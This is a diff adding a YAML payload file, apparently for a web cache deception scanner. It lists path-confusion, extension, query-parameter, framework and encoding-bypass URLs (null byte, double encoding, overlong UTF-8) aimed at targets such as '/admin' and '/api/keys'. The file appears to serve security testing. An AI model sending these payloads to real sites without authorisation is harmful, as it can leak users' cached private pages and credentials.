@@ -1,0 +1,197 @@
+category_map:
+  extension:
+    - css_ext
+    - js_ext
+    - png_ext
+    - gif_ext
+    - ico_ext
+  path:
+    - trailing_slash
+    - double_slash
+    - semicolon_path
+    - fragment_bypass
+    - case_path
+  parameter:
+    - cache_param
+    - utm_source
+    - cb_param
+    - nocache_bypass
+    - version_param
+  framework:
+    - django_static
+    - flask_static
+    - express_static
+    - rails_asset
+    - spring_static
+  bypass:
+    - double_encode
+    - null_byte
+    - unicode_path
+    - backslash_path
+    - case_extension
+
+extension_payloads:
+  - - css_ext
+    - "/admin.css"
+    - - admin
+      - css
+      - cache
+      - static
+  - - js_ext
+    - "/secret.js"
+    - - secret
+      - js
+      - cache
+      - static
+  - - png_ext
+    - "/profile.png"
+    - - profile
+      - png
+      - cache
+      - image
+  - - gif_ext
+    - "/data.gif"
+    - - data
+      - gif
+      - cache
+      - image
+  - - ico_ext
+    - "/auth.ico"
+    - - auth
+      - ico
+      - cache
+      - favicon
+
+path_payloads:
+  - - trailing_slash
+    - "/admin/"
+    - - admin
+      - cache
+      - static
+  - - double_slash
+    - "/admin//"
+    - - admin
+      - cache
+      - double
+  - - semicolon_path
+    - "/admin;.css"
+    - - admin
+      - css
+      - semicolon
+      - cache
+  - - fragment_bypass
+    - "/admin#.css"
+    - - admin
+      - css
+      - fragment
+      - cache
+  - - case_path
+    - "/Admin/"
+    - - Admin
+      - cache
+      - case
+
+parameter_payloads:
+  - - cache_param
+    - "?cache=1"
+    - - cache
+      - param
+      - static
+  - - utm_source
+    - "?utm_source=test"
+    - - utm_source
+      - cache
+      - param
+  - - cb_param
+    - "?cb=12345"
+    - - cb
+      - cache
+      - param
+      - callback
+  - - nocache_bypass
+    - "?nocache=0"
+    - - nocache
+      - cache
+      - param
+  - - version_param
+    - "?v=1.0"
+    - - v=
+      - cache
+      - param
+      - version
+
+framework_payloads:
+  - - django_static
+    - "/static/admin.css"
+    - - static
+      - admin
+      - css
+      - django
+  - - flask_static
+    - "/static/secret.js"
+    - - static
+      - secret
+      - js
+      - flask
+  - - express_static
+    - "/public/admin.css"
+    - - public
+      - admin
+      - css
+      - express
+  - - rails_asset
+    - "/assets/admin.css"
+    - - assets
+      - admin
+      - css
+      - rails
+  - - spring_static
+    - "/resources/admin.css"
+    - - resources
+      - admin
+      - css
+      - spring
+
+bypass_payloads:
+  - - double_encode
+    - "/%2561dmin.css"
+    - - admin
+      - css
+      - double
+      - encode
+  - - null_byte
+    - "/admin%00.css"
+    - - admin
+      - css
+      - null
+      - bypass
+  - - unicode_path
+    - "/%E0%80%80admin.css"
+    - - admin
+      - css
+      - unicode
+      - bypass
+  - - backslash_path
+    - "/\\admin.css"
+    - - admin
+      - css
+      - backslash
+      - bypass
+  - - case_extension
+    - "/admin.CSS"
+    - - admin
+      - CSS
+      - case
+      - extension
+
+sensitive_paths:
+  - "/admin"
+  - "/secret"
+  - "/profile"
+  - "/dashboard"
+  - "/settings"
+  - "/api/keys"
+  - "/api/users"
+  - "/internal"
+  - "/debug"
+  - "/config"
